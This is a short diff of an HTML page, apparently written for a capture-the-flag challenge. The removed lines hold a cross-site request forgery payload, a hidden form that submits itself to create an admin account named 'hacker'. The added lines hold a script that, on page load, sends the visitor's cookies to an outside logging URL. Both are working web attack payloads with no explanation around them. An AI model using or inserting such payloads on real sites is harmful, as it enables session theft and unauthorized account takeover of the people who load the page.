@@ -1,11 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form action="http://tasks.goidactf.ru:20159/create_admin" method="POST">
-  <input type="hidden" name="new_admin_login" value="hacker">
-</form>
+<h1>test</h1>
 <script>
-  document.forms[0].submit();
+fetch("https://kellvin223.github.io/csrf/log?c=" + document.cookie);
 </script>
 </body>
 </html>
